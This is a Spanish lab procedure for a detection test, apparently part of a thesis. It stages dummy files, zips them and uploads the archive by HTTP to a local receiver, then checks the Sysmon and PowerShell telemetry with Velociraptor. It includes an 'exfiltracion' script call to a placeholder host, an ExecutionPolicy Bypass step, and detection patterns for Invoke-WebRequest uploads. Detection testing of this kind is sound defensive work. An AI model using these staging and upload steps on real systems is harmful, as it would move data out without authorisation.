# TEC-009 Validacion De Transferencia Controlada

## Proposito

TEC-009 simula staging, archivado y transferencia HTTP controlada de datos dummy hacia un receptor local del laboratorio. La prueba permite generar telemetria host-based verificable de preparacion y transferencia, sin uso de datos reales ni infraestructura externa. La tecnica no representa exfiltracion de informacion sensible, sino una transferencia controlada disenada para evaluar la visibilidad y capacidad de deteccion de Velociraptor.

## Alcance

- CU: CU-009.
- Tecnicas principales: T1074.001 Local Data Staging y T1560.001 Archive Collected Data.
- Red: contexto de transferencia controlada HTTP dentro del laboratorio.
- No se usan credenciales.
- No se usan servicios publicos externos para subir el ZIP.
- No se ejecuta, descomprime ni interpreta el contenido recibido.

## Archivos

- `scripts_candidate\receiver_tfm_v2.py`: receptor HTTP local.
- `scripts_candidate\Start-TFMReceiver.ps1`: arranque del receptor.
- `scripts_candidate\Stop-TFMReceiver.ps1`: parada opcional por PID.
- `scripts_candidate\exfiltracion_v3.ps1`: staging, archivado, copia local, hash y upload HTTP controlado.
- `runner_candidate\TFM_Run_All_TEC_Tests_v3.ps1`: runner versionado para integrar TEC-009 final si se desea ejecutar campana completa.

## Evidencias Esperadas

- PowerShell 4104: `Compress-Archive`, `Copy-Item`, `Invoke-WebRequest`, `-InFile` y URL del receptor.
- Sysmon ID 1: `powershell.exe` ejecutando la tecnica.
- Sysmon ID 3: conexion TCP desde `powershell.exe` al receptor.
- Sysmon ID 11: ZIP creado si Sysmon registra FileCreate.
- Log del receptor: bytes recibidos, SHA256, IP origen, metodo HTTP, path y User-Agent.
- Comparacion de integridad: SHA256 local igual al SHA256 recibido.

## Arranque Del Receptor

En el host receptor:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd C:\Users\seguridad\Desktop\TFM
.\scripts_candidate\Start-TFMReceiver.ps1 -Port 8000 -MaxSeconds 120 -MaxUploads 1
```

El script muestra una o varias URL de subida:

```text
http://<IP_HOST>:8000/upload
```

## Prueba De Conectividad Desde La VM

```powershell
Test-NetConnection <IP_HOST> -Port 8000
```

## Ejecucion Directa De TEC-009 Final

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd C:\Users\seguridad\Desktop\TFM

.\scripts_candidate\exfiltracion_v3.ps1 `
  -WorkDir "C:\Users\seguridad\Desktop\TFM\Pruebas\DUMB_LAB" `
  -OutputDir "C:\Users\seguridad\Desktop\TFM\Pruebas\TEC-009_Exfiltracion\staging_controlled" `
  -ReceiverUrl "http://<IP_HOST>:8000/upload" `
  -EnableUpload:$true `
  -TimeoutSec 30 `
  -ZipName "tec009_controlled_archive.zip" `
  -KeepArtifacts:$true
```

## Ejecucion Mediante Runner V3

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd C:\Users\seguridad\Desktop\TFM

.\runner_candidate\TFM_Run_All_TEC_Tests_v3.ps1 `
  -Tec009ReceiverUrl "http://<IP_HOST>:8000/upload" `
  -Tec009EnableUpload $true
```

## Validaciones

Ver log del receptor:

```powershell
Get-Content "C:\Users\seguridad\Desktop\TFM\Pruebas\Receiver\received_controlled\receiver_log.jsonl" -Tail 5
```

Buscar 4104 relevante:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName="Microsoft-Windows-PowerShell/Operational"
  Id=4104
  StartTime=$t0
  EndTime=$t1
} | Where-Object {
  $_.Message -match "Compress-Archive|Copy-Item|Invoke-WebRequest|-InFile"
} | Select-Object TimeCreated,Id,Message
```

Buscar Sysmon ID 1:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName="Microsoft-Windows-Sysmon/Operational"
  Id=1
  StartTime=$t0
  EndTime=$t1
} | Where-Object {
  $_.Message -match "powershell.exe" -and $_.Message -match "Invoke-WebRequest|-InFile|Compress-Archive|Copy-Item"
} | Select-Object TimeCreated,Id,Message
```

Buscar Sysmon ID 3:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName="Microsoft-Windows-Sysmon/Operational"
  Id=3
  StartTime=$t0
  EndTime=$t1
} | Where-Object {
  $_.Message -match "powershell.exe" -and $_.Message -match "DestinationPort: 8000"
} | Select-Object TimeCreated,Id,Message
```

Buscar Sysmon ID 11 opcional:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName="Microsoft-Windows-Sysmon/Operational"
  Id=11
  StartTime=$t0
  EndTime=$t1
} | Where-Object {
  $_.Message -match "powershell.exe" -and $_.Message -match "\.zip"
} | Select-Object TimeCreated,Id,Message
```

Comparar hash local y recibido:

```powershell
$summary = Get-Content "C:\Users\seguridad\Desktop\TFM\Pruebas\TEC-009_Exfiltracion\staging_controlled\tec009_transfer_summary.json" -Raw | ConvertFrom-Json
$receiver = Get-Content "C:\Users\seguridad\Desktop\TFM\Pruebas\Receiver\received_controlled\receiver_log.jsonl" | Select-Object -Last 1 | ConvertFrom-Json

[PSCustomObject]@{
  LocalSHA256 = $summary.LocalSHA256
  ReceivedSHA256 = $receiver.sha256
  Match = ($summary.LocalSHA256 -eq $receiver.sha256)
  LocalBytes = $summary.ZipBytes
  ReceivedBytes = $receiver.bytes_received
}
```

## Criterio De Exito

- El receptor devuelve HTTP 200.
- Existe ZIP local y copia local.
- El log del receptor contiene una entrada con bytes recibidos y SHA256.
- SHA256 local y SHA256 recibido coinciden.
- Hay telemetria host-based de staging, archivado y transferencia HTTP controlada.
- La prueba se documenta como transferencia controlada de datos dummy, no como exfiltracion real de informacion sensible.
